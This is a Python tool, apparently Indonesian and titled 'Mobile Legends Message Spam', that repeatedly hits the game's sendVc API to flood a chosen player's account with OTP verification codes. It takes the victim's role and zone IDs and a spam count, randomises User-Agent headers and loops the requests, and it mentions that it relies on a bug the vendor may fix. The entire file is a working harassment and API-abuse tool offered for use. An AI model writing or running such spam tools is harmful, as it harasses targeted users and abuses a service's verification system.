try:
    from requests.exceptions import RequestException
    import requests, time, sys, threading
    from rich.console import Console
    from rich.panel import Panel
    from rich import print as printf
    from fake_useragent import UserAgent
except (ModuleNotFoundError):
    exit(
        "[!] Some Modules are Missing. Please Install Them Using: `pip install -r requirements.txt`"
    )

SUKSES, GAGAL, ERROR, LOOPING = 0, 0, 0, 0
LOCK = threading.Lock()


def SEND_REQUEST(ROLE_ID, ZONE_ID):
    global SUKSES, GAGAL, ERROR, LOOPING
    with requests.Session() as SESSION:
        try:
            PAYLOAD = {"roleId": ROLE_ID, "zoneId": ZONE_ID}
            SESSION.headers.update(
                {
                    "Accept-Encoding": "gzip, deflate, br, zstd",
                    "Accept-Language": "en-US,en;q=0.9",
                    "Content-Length": str(len(str(PAYLOAD))),
                    "Connection": "keep-alive",
                    "Host": "api.mobilelegends.com",
                    "Origin": "https://www.mobilelegends.com",
                    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                    "Accept": "*/*",
                    "Sec-Fetch-Site": "same-site",
                    "Sec-Fetch-Dest": "empty",
                    "Referer": "https://www.mobilelegends.com/",
                    "Sec-Fetch-Mode": "cors",
                    "User-Agent": UserAgent().random,
                }
            )

            RESPONSE = SESSION.post(
                "https://api.mobilelegends.com/base/sendVc", data=PAYLOAD
            )
            with LOCK:
                LOOPING += 1
                if '"msg":"ok"' in RESPONSE.text:
                    printf(
                        f"[bold bright_black]   ──>[bold green] Pengiriman OTP Berhasil!      ",
                        end="\r",
                    )
                    time.sleep(5.0)
                    SUKSES += 1
                elif '"msg":""' in RESPONSE.text:
                    threading.Thread(target=HANDLE_DELAY).start()
                else:
                    printf(
                        f"[bold bright_black]   ──>[bold red] Pengiriman OTP Gagal!           ",
                        end="\r",
                    )
                    time.sleep(5.0)
                    GAGAL += 1
        except (RequestException) as e:
            with LOCK:
                ERROR += 1
                printf(
                    f"[bold bright_black]   ──>[bold red] Error Saat Mengirim Permintaan!     ",
                    end="\r",
                )
                time.sleep(5.0)
    return "null"


def HANDLE_DELAY():
    printf(
        f"[bold bright_black]   ──>[bold white] Tunggu 60 Detik!                ",
        end="\r",
    )


def BASE_SPAMMER(NUM_REQUESTS, ROLE_ID, ZONE_ID):
    THREADS = []
    START_TIME = time.time()

    for I in range(NUM_REQUESTS):
        T = threading.Thread(target=SEND_REQUEST, args=(ROLE_ID, ZONE_ID))
        THREADS.append(T)
        T.start()
        for SLEEP in range(60, 0, -1):
            printf(
                f"[bold bright_black]   ──>[bold white] Spamming[bold blue] {ROLE_ID}[bold white]/[bold blue]{SLEEP}[bold white] Sukses:-[bold green]{SUKSES}[bold white] Gagal:-[bold red]{GAGAL}[bold white]     ",
                end="\r",
            )
            time.sleep(1)

    for T in THREADS:
        T.join()

    DURATION = time.time() - START_TIME
    MINUTES, SECONDS = divmod(int(DURATION), 60)

    printf(
        Panel(
            f"[bold white]Successfully sent all Spam, with[bold green] {SUKSES}[bold white] successes and[bold yellow] {GAGAL}[bold white] fail\nures, then there were[bold red] {ERROR}[bold white] error deliveries.\nThis process was completed in {MINUTES} minutes and {SECONDS} seconds!",
            width=65,
            style="bold bright_black",
            title="> [ Sukses ] <",
        )
    )


if __name__ == "__main__":
    try:
        printf(
            Panel(
                "[bold red] .--.  .-.       .-.                              .-.      \n: ,. :.' `.      : :                              : :      \n: :: :`. .'.---. : :    .--.  .--.  .--. ,-.,-. .-' : .--. \n: :; : : : : .; `: :__ ' '_.'' .; :' '_.': ,. :' .; :`._-.'\n[bold white]`.__.' :_; : ._.':___.'`.__.'`._. ;`.__.':_;:_;`.__.'`.__.'\n           : :                .-. :                        \n           :_;                `._.'                        \n          [underline green]Mobile Legends Message Spam - by Rozhak",
                width=65,
                style="bold bright_black",
            )
        )

        printf(
            Panel(
                f"[bold white]Please fill in the amount of spam you want to send, for examp\nle:[bold green] 1000[bold white] *[bold red]remember you can only write numbers[bold white]!",
                width=65,
                style="bold bright_black",
                subtitle="╭────────",
                subtitle_align="left",
                title="> [ Jumlah Spam ] <",
            )
        )
        JUMLAH_SPAM = int(Console().input("[bold bright_black]   ╰─> "))
        printf(
            Panel(
                f"[bold white]Please fill in the role ID you want to spam, for example:[bold green] 123587555[bold white] *[bold red]remember you can only write numbers[bold white]!",
                width=65,
                style="bold bright_black",
                subtitle="╭────────",
                subtitle_align="left",
                title="> [ ZoneId ] <",
            )
        )
        ROLE_ID = int(Console().input("[bold bright_black]   ╰─> "))
        printf(
            Panel(
                f"[bold white]Please fill in the zone ID you want to send spam to, for exam\nple:[bold green] 2612[bold white] *[bold red]remember you can only write numbers[bold white]!",
                width=65,
                style="bold bright_black",
                subtitle="╭────────",
                subtitle_align="left",
                title="> [ RoleId ] <",
            )
        )
        ZONE_ID = int(Console().input("[bold bright_black]   ╰─> "))

        printf(
            Panel(
                f"[bold white]Sending spam, you can use[bold red] CTRL + C[bold white] or[bold red] CTRL + Z[bold white] to stop. If sending fails, it is likely that your\nrole id or zone id is wrong or the bug has been fixed!",
                width=65,
                style="bold bright_black",
                title="> [ Catatan ] <",
            )
        )

        BASE_SPAMMER(NUM_REQUESTS=JUMLAH_SPAM, ROLE_ID=ROLE_ID, ZONE_ID=ZONE_ID)
        sys.exit(0)
    except (Exception) as e:
        printf(
            Panel(
                f"[bold red]{str(e).capitalize()}!",
                width=65,
                style="bold bright_black",
                title="> [ Error ] <",
            )
        )
        sys.exit(1)
    except (KeyboardInterrupt):
        sys.exit(1)